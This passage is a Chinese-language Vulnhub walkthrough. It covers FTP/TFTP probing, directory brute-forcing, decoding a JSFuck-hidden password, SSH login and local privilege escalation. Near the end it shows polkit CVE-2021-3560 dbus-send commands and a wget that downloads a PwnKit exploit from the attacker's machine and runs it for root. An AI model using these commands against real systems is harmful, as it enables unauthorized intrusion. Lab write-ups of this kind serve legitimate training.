Permission denied.<br>ftp: Login failed<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): morris<br>530 Permission denied.<br>ftp: Login failed<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br></code></pre></td></tr></table></figure><p>都失败了，有点郁闷，还有个 tftp 尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ tftp 192.168.56.112<br>tftp&gt; <span class="hljs-built_in">ls</span><br>?Invalid <span class="hljs-built_in">command</span><br>tftp&gt; <br>tftp&gt; ?<br>Commands may be abbreviated.  Commands are:<br><br>connect         connect to remote tftp<br>mode            <span class="hljs-built_in">set</span> file transfer mode<br>put             send file<br>get             receive file<br>quit            <span class="hljs-built_in">exit</span> tftp<br>verbose         toggle verbose mode<br>trace           toggle packet tracing<br>status          show current status<br>binary          <span class="hljs-built_in">set</span> mode to octet<br>ascii           <span class="hljs-built_in">set</span> mode to netascii<br>rexmt           <span class="hljs-built_in">set</span> per-packet retransmission <span class="hljs-built_in">timeout</span><br><span class="hljs-built_in">timeout</span>         <span class="hljs-built_in">set</span> total retransmission <span class="hljs-built_in">timeout</span><br>?               <span class="hljs-built_in">print</span> <span class="hljs-built_in">help</span> information<br>tftp&gt; status<br>Connected to 192.168.56.112.<br>Mode: netascii Verbose: off Tracing: off<br>Rexmt-interval: 5 seconds, Max-<span class="hljs-built_in">timeout</span>: 25 seconds<br></code></pre></td></tr></table></figure><p>连接成功了，但是 tfpt 无法列出文件列表，先暂时搁置。之后我又反复翻了翻 nfs 挂载中的各个文件夹，能确定的是这台靶机的桌面服务可能用的是 gnome，还有 gpg 软件，另外有一些 db 文件，但是没什么有价值的信息，似乎是访问信息的汇总（网站记录了多个访问信息）。到这里得到的有价值的信息仅限于一个用户名 <code>morris</code>，看一看 Web 服务吧</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>index 界面加载了很久</p><p><img src="/pic/0227b8e4e8ef8e98b73888276757ac08_MD5.png"></p><p>首先看看内容，大意是姐弟的名字只差了 M 和 N，剩余部分是完全一致的，那我们又得到了一个用户名<code>norris</code>，再就是这个网站中有一些备份，以及一些挑战游戏</p><p>看了看网页源代码，没有什么隐藏信息，上面的按钮指向 <code>index.htm</code> 也就是此界面。目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 -x txt,zip,sql,rar,php,htm <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.112<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              rar,php,htm,txt,zip,sql<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/12 09:44:29 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.htm            (Status: 200) [Size: 2186]<br>/.htm                 (Status: 403) [Size: 293]<br>/images               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/images/]<br>/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/manual/]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.112/javascript/]<br>/hits.txt             (Status: 200) [Size: 44]<br>/backups              (Status: 200) [Size: 6301]<br>/mysite               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/mysite/]<br>/.htm                 (Status: 403) [Size: 293]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1543646 / 1543927 (99.98%)===============================================================<br>2023/06/12 09:47:01 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>一些值得关注的目录：&#x2F;images,&#x2F;manual,&#x2F;hits.txt,&#x2F;backups,&#x2F;mysite 优先看一下 hits.txt，得到以下这样一句话，提醒我们要更强地枚举</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-comment">Remember! Keep your enumeration game strong!</span><br></code></pre></td></tr></table></figure><p>接下来逐个看看目录下有什么信息</p><p><img src="/pic/b545a1a530fe57030b285dad593ece46_MD5.png"></p><p>images 目录下有两个图片，也就是刚才主页上看到的图片，把他们下载下来，看看是否有隐写信息，分别使用 <code>file</code>, <code>exiftool</code>, <code>binwalk</code> 来判断是否有隐写信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ file game.jpg m.gif<br>game.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 192x192, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6, orientation=upper-left], progressive, precision 8, 712x350, components 3<br>m.gif:    GIF image data, version 89a, 245 x 245<br></code></pre></td></tr></table></figure><p>文件头正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ binwalk game.jpg m.gif<br><br>Scan Time:     2023-06-12 10:01:48<br>Target File:   /home/kali/Downloads/connectthedots/game.jpg<br>MD5 Checksum:  338f994c6e56b436b5db64049e81a5d2<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br>30            0x1E            TIFF image data, big-endian, offset of first image directory: 8<br><br><br>Scan Time:     2023-06-12 10:01:48<br>Target File:   /home/kali/Downloads/connectthedots/m.gif<br>MD5 Checksum:  7b76f7dcf7e2569ec2a64de68f850517<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             GIF image data, version <span class="hljs-string">&quot;89a&quot;</span>, 245 x 245<br><br></code></pre></td></tr></table></figure><p>binwalk 显示没有拼接的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool game.jpg                                                                                  <br>ExifTool Version Number         : 12.57<br>File Name                       : game.jpg<br>Directory                       : .<br>File Size                       : 38 kB<br>File Modification Date/Time     : 2019:10:10 14:08:19-04:00<br>File Access Date/Time           : 2023:06:12 10:01:09-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:00:40-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 192<br>Y Resolution                    : 192<br>Exif Byte Order                 : Big-endian (Motorola, MM)<br>Orientation                     : Horizontal (normal)<br>Image Width                     : 712<br>Image Height                    : 350<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 712x350<br>Megapixels                      : 0.249<br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool m.gif   <br>ExifTool Version Number         : 12.57<br>File Name                       : m.gif<br>Directory                       : .<br>File Size                       : 933 kB<br>File Modification Date/Time     : 2019:10:10 14:12:14-04:00<br>File Access Date/Time           : 2023:06:12 10:01:09-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:00:50-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 245<br>Image Height                    : 245<br>Has Color Map                   : Yes<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 8<br>Background Color                : 255<br>Animation Iterations            : Infinite<br>XMP Toolkit                     : Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27<br>Creator Tool                    : Adobe Photoshop CS6 (Macintosh)<br>Instance ID                     : xmp.iid:085685312E1611E2A32B9E634BBB29DA<br>Document ID                     : xmp.did:085685322E1611E2A32B9E634BBB29DA<br>Derived From Instance ID        : xmp.iid:A5C200202E1511E2A32B9E634BBB29DA<br>Derived From Document ID        : xmp.did:085685302E1611E2A32B9E634BBB29DA<br>Transparent Color               : 255<br>Frame Count                     : 25<br>Duration                        : 2.50 s<br>Image Size                      : 245x245<br>Megapixels                      : 0.060<br></code></pre></td></tr></table></figure><p>exiftool 显示的结果中也没有有价值的信息，有一丢丢烦躁了。继续查看别的目录吧</p><p><img src="/pic/c92d9bb6f08fba9bc68bd64f38419131_MD5.png"></p><p>backups 给了一个视频，关于这个视频里有没有隐藏信息，其实也需要留心，这里我只留下一个标记，等没头绪的话，再考虑视频信息隐藏的可能性。</p><p><img src="/pic/d63de15867a560e1991a0c41f8ff628a_MD5.png"></p><p>manual 是 apache 的手册，简单看了眼，没什么可以利用地方，这种应该是默认的界面，出现漏洞话，应该是 apache 本身有漏洞才有可能，搜了一下 apache 这个版本的漏洞，只有一个提权漏洞，暂时没什么价值</p><p><img src="/pic/5d2db95f8a3cd0eeb26deab9728de09f_MD5.png"></p><p>这里是网站目录下的文件，但是有个文件是 cs 后缀和平常文件似乎不一样，保存打开看看</p><p><img src="/pic/aa431a16060a553fe9e0b79712c42fdb_MD5.png"></p><p>这里并不知道到底是什么奇奇怪怪的语言，直接搜索也没有搜索到，先看了看红队笔记，原来是 JSFuck（，去掉一些无关的字符，然后去在线网站<a href="https://jsfuck.com/#">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a>，得到了密码 <code>TryToGuessThisNorris@2k19</code></p><p><img src="/pic/5d23246930d2729618b15fc7772a0df0_MD5.png"></p><p>尝试用这个密码登录 ssh、ftp，这里要记得我们有两个用户名 <code>morris</code> 和 <code>norris</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec/.cache/evolution/tasks]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): norris<br>331 Please specify the password.<br>Password: <br>421 Timeout.<br>ftp: Login failed<br>ftp&gt; e<br>?Ambiguous <span class="hljs-built_in">command</span>.<br>ftp&gt; <span class="hljs-built_in">exit</span><br><br>┌──(kali㉿kali)-[/tmp/infosec/.cache/evolution/tasks]<br>└─$ ftp 192.168.56.112                                        <br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): norris<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||62846|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 1001     1001         4096 Oct 11  2019 files<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> files<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||27359|)<br>150 Here comes the directory listing.<br>-r--------    1 1001     1001         6301 Oct 11  2019 backups.bak<br>-r--------    1 1001     1001        39610 Oct 11  2019 game.jpg.bak<br>-r--------    1 1001     1001           29 Oct 11  2019 hits.txt.bak<br>-r--------    1 1001     1001       932659 Oct 11  2019 m.gif.bak<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br></code></pre></td></tr></table></figure><p>ftp 中得到了一些备份文件，稍后逐个检查，不过看起来是我们之前在查看网页目录结构时看到的信息的备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh -i id_rsa morris@192.168.56.112 -p 7822<br>morris@192.168.56.112\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">morris@192.168.56.112\&#x27;</span>s password: <br><br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh norris@192.168.56.112 -p 7822  <br>norris@192.168.56.112\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string"></span><br><span class="hljs-string">###</span><br><span class="hljs-string">   #     #    #     #     #####     #      ##     #####     #    #    #   ####</span><br><span class="hljs-string">   #     ##   #     #       #       #     #  #      #       #    ##   #  #    #</span><br><span class="hljs-string">   #     # #  #     #       #       #    #    #     #       #    # #  #  #</span><br><span class="hljs-string">   #     #  # #     #       #       #    ######     #       #    #  # #  #  ###</span><br><span class="hljs-string">   #     #   ##     #       #       #    #    #     #       #    #   ##  #    #</span><br><span class="hljs-string">  ###    #    #     #       #       #    #    #     #       #    #    #   ####</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Mon Jun 12 20:03:57 2023 from 192.168.56.106</span><br><span class="hljs-string">norris@sirrom:~$ pwd</span><br><span class="hljs-string">/home/norris</span><br><span class="hljs-string">norris@sirrom:~$ ls</span><br><span class="hljs-string">ftp  user.txt</span><br></code></pre></td></tr></table></figure><p>使用刚才的密码，ssh 登录 norris 用户成功，ftp 目录就在当前用户的目录下</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 suid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper<br>/usr/lib/xorg/Xorg.wrap<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/sbin/pppd<br>/usr/sbin/mount.nfs<br>/usr/bin/gpasswd<br>/usr/bin/umount<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/fusermount<br>/usr/bin/chfn<br>/usr/bin/bwrap<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/pkexec<br>/usr/bin/ntfs-3g<br>/usr/bin/chsh<br>/usr/bin/sudo<br></code></pre></td></tr></table></figure><p>这里自己尝试了一些漏洞，主要是针对 polkit 的漏洞 <a href="https://ine.com/blog/exploiting-pwnkit-cve-20214034">Lab Walkthrough - Exploiting PwnKit (CVE-2021–4034) | INE</a> 这篇文章是针对 CVE-2021-4034 的，但是有个问题是靶机中 gcc 无法使用，后续又看到了有使用 CVE-2021-3560 漏洞的 <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/polkit-privilege-escalation/">PolKit Privilege Escalation | Exploit Notes (hdks.org)</a>。但是尝试失败了还参考了这篇文章 <a href="https://zhuanlan.zhihu.com/p/556166195">vulnhub刷题记录（Dripping Blues: 1） - 知乎 (zhihu.com)</a> </p><blockquote><p>它允许非特权用户使用 DBus 调用特权方法，在这个漏洞中我们将调用 accountservice 提供的 2 个特权方法（CreateUser 和 SetPassword），这允许我们创建一个特权用户然后为其设置密码，最后以创建的用户身份登录，然后提升为root。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/usr/bin$ time dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ignite string:<span class="hljs-string">&quot;ignite user&quot;</span> int32:1Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required<br><br>real    0m0.008s<br>user    0m0.001s<br>sys     0m0.000s<br>norris@sirrom:/usr/bin$ dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:<span class="hljs-string">&quot;Tester Account&quot;</span> int32:1 &amp; <span class="hljs-built_in">sleep</span> 0.0015s; <span class="hljs-built_in">kill</span> $!<br>[1] 2990<br>norris@sirrom:/usr/bin$ <span class="hljs-built_in">id</span> tester<br><span class="hljs-built_in">id</span>: ‘tester’: no such user<br>[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:<span class="hljs-string">&quot;Tester Account&quot;</span> int32:1<br>norris@sirrom:/usr/bin$ <span class="hljs-built_in">id</span> tester<br><span class="hljs-built_in">id</span>: ‘tester’: no such user<br></code></pre></td></tr></table></figure><h3 id="Linux-Polkit-权限提升漏洞CVE-2021-4034"><a href="#Linux-Polkit-权限提升漏洞CVE-2021-4034" class="headerlink" title="Linux Polkit 权限提升漏洞CVE-2021-4034"></a>Linux Polkit 权限提升漏洞CVE-2021-4034</h3><p>后续看了眼红队笔记，给的提权思路很好，但是强经验相关，因此自己又找了别的 exp：<a href="https://blog.csdn.net/qq_44287822/article/details/123743693">(4条消息) Linux Polkit 权限提升漏洞CVE-2021-4034_灬半醉半醒半痴呆つ的博客-CSDN博客</a> 其中提到了一个脚本 <a href="https://github.com/dzonerzy/poc-cve-2021-4034">https://github.com/dzonerzy/poc-cve-2021-4034</a> 。将其下载到本地，然后靶机访问本机的 http 服务按照脚本里的内容，将文件下载到 tmp 目录下，然后直接运行就可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/tmp$ wget http://192.168.56.106:8088/exploit -O exploit<br>--2023-06-13 06:30:13--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit                      100%[==============================================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.03s   <br><br>2023-06-13 06:30:13 (123 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>norris@sirrom:/tmp$ <span class="hljs-built_in">ls</span><br>exploit<br>norris@sirrom:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit <br>norris@sirrom:/tmp$ ./exploit <br>2023/06/13 06:30:28 CMDTOEXECUTE is empty fallback to default value<br>2023/06/13 06:30:28 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),27(sudo),1001(norris)<br><span class="hljs-comment"># cat /root/root.txt</span><br>8fc9376d961670ca10be270d52eda423<br></code></pre></td></tr></table></figure><h2 id="补充思路"><a href="#补充思路" class="headerlink" title="补充思路"></a>补充思路</h2><h3 id="横向用户切换"><a href="#横向用户切换" class="headerlink" title="横向用户切换"></a>横向用户切换</h3><p>ftp 中有一些bak文件，但是之前没有仔细查看，这里仔细对文件进行检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool *.bak                                                                                     <br>======== backups.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : backups.bak<br>Directory                       : .<br>File Size                       : 6.3 kB<br>File Modification Date/Time     : 2019:10:10 22:47:30-04:00<br>File Access Date/Time           : 2023:06:12 10:26:39-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:26:39-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : MP4<br>File Type Extension             : mp4<br>MIME Type                       : video/mp4<br>Major Brand                     : Unknown (mp4v)<br>Minor Version                   : 0.0.0<br>Compatible Brands               